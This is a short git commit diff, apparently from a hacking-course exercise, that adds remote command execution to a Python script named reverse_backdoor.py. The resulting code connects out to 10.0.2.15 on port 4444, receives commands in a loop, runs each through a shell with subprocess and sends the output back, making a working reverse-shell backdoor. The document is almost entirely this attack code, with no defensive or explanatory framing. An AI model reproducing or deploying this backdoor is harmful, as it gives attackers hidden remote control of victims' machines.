620e9f7bc094518e148890798dd850852f27a85e
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-09-30 22:08:37 -0400

    Execute commands remotely

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,13 +1,19 @@
 #!/usr/bin/env python
 
 import socket
+import subprocess
+
+def execute_system_command(command):
+    return subprocess.check_output(command, shell=True)
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(("10.0.2.15", 4444))
 
 connection.send("\n[+] Connection established.\n")
 
-recieved_data = connection.recv(1024)
-print(recieved_data)
+while True:
+    command = recieved_data = connection.recv(1024)
+    command_result = execute_system_command(command)
+    connection.send(command_result)
 
 connection.close()
